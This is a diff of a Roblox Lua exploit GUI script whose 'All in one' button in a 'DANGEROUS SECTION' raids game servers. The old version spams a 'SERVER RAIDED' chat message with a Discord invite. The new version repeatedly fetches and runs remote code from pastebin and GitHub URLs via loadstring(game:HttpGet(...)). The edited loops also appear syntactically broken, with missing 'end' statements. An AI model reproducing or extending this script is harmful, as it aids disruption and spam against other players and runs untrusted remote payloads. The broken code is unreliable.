@@ -84,7 +84,7 @@ TextButton.BackgroundColor3 = Color3.fromRGB(31, 31, 40)
 TextButton.Position = UDim2.new(0.0538115874, 0, 0.579365075, 0)
 TextButton.Size = UDim2.new(0, 187, 0, 44)
 TextButton.Font = Enum.Font.GothamBold
-TextButton.Text = "Chat It!"
+TextButton.Text = "Chat!"
 TextButton.TextColor3 = Color3.fromRGB(189, 189, 189)
 TextButton.TextSize = 20.000
 TextButton.MouseButton1Down:Connect(function()
@@ -175,19 +175,17 @@ Tab1Section:NewButton("Unloopfling all", "why did u click ?", function()
 end)
 
 local Tab1Section2 = Tab1:NewSection("DANGEROUS SECTION") -- Create a new section for the last button
-Tab1Section2:NewButton("All in one. [CANNOT BE STOPPED]", "why u click", function()
+Tab1Section2:NewButton("All in one.", "why u click", function()
     -- script here
     local i = 1
     while i <= 50 do
-        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("! .gg/Jpxrg3cJ || EZ RAID LOL || SERVER RAIDED.", "All")
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/FlavorYT/SPAM-EZ-GG/main/MADE%20BY%20FLAVORLEAKS%20DISCORD"))()
         i = i + 1
-    end
-
-    loadstring(game:HttpGet("https://pastebin.com/raw/zqyDSUWX"))()
-    wait(10)
-    loadstring(game:HttpGet("https://pastebin.com/raw/zqyDSUWX"))()
-    wait(10)
-    loadstring(game:HttpGet("https://pastebin.com/raw/zqyDSUWX"))()
+    
+    local i = 1
+    while i <= 10 do
+        loadstring(game:HttpGet("https://pastebin.com/raw/zqyDSUWX"))()
+        i = i + 1
 end)
 
 local Tab2 = Window:NewTab("Extra")
